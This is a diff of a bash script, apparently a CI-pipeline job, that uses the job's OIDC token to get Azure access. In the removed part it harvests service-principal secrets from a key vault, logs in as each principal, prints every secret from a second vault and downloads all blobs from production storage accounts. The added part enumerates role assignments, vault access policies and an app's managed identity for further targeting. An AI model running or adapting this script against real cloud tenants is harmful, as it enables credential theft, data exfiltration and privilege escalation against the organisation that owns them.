@@ -1,39 +1,29 @@
 #!/usr/bin/env bash
 set -uo pipefail
-MS="x-ms-version: 2021-08-06"
+SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
 OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
-exch(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" \
+ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
+  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" \
   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-  -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }
-spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
-  -d "client_id=$1" -d "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }
+  -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
+A=(-sS -H "Authorization: Bearer $ARM")
 
-KV=$(exch "https://vault.azure.net/.default")
-SECNAMES="cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal"
-ACCTS="sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz"
+RD=$(curl "${A[@]}" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01")
 
-for s in $SECNAMES; do
-  J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" | jq -r '.value')
-  AID=$(echo "$J" | jq -r '.appId'); SEC=$(echo "$J" | jq -r '.clientSecret')
-  echo "################ $s ($AID) ################"
-  VT=$(spt "$AID" "$SEC" "https://vault.azure.net/.default")
-  [ -z "$VT" ] && { echo "  login FAIL"; continue; }
-  echo "  kv-tbl-sec: $(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r 'if .value then ([.value[].id]|join(",")) else ("ERR "+.error.code) end')"
-  # neu kv-tbl-sec doc duoc, dump luon gia tri
-  for id in $(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[]?.id' 2>/dev/null); do
-    echo "    --- $id ---"; curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4" | jq -r '.value'
-  done
-  ST=$(spt "$AID" "$SEC" "https://storage.azure.com/.default")
-  for AC in $ACCTS; do
-    CT=$(curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$AC.blob.core.windows.net/?comp=list")
-    for c in $(echo "$CT" | grep -oE '<Name>[^<]+</Name>' | sed -E 's#</?Name>##g'); do
-      BL=$(curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$AC.blob.core.windows.net/$c?restype=container&comp=list")
-      names=$(echo "$BL" | grep -oE '<Name>[^<]+</Name>' | sed -E 's#</?Name>##g')
-      [ -z "$names" ] && continue
-      echo "  *** $AC/$c blobs: $(echo $names | tr '\n' ' ')"
-      for b in $names; do echo "      >>> $AC/$c/$b"; curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$AC.blob.core.windows.net/$c/$b"; echo; done
-    done
-  done
-done
+echo "########## ROLE ASSIGNMENTS (role | principalId | scope) ##########"
+curl "${A[@]}" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
+ | jq --argjson rd "$RD" -r '
+   ($rd.value|map({(.name):.properties.roleName})|add) as $m
+   | .value[]? | "\($m[(.properties.roleDefinitionId|split("/")|last)] // (.properties.roleDefinitionId|split("/")|last))\t\(.properties.principalId)\t\(.properties.scope)"' \
+ | sort
+
+RES=$(curl "${A[@]}" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01")
+echo "########## kv-tbl-sec: rbac flag + accessPolicies ##########"
+VID=$(echo "$RES" | jq -r '.value[]|select(.name=="kv-tbl-sec-x3euoz")|.id')
+curl "${A[@]}" "https://management.azure.com$VID?api-version=2022-07-01" \
+ | jq '.properties | {enableRbacAuthorization, accessPolicies:[.accessPolicies[]?|{objectId,secrets:.permissions.secrets}]}'
+
+echo "########## app-tbl-storefront-prod identity ##########"
+SID=$(echo "$RES" | jq -r '.value[]|select(.name=="app-tbl-storefront-prod")|.id')
+curl "${A[@]}" "https://management.azure.com$SID?api-version=2022-03-01" | jq '.identity'
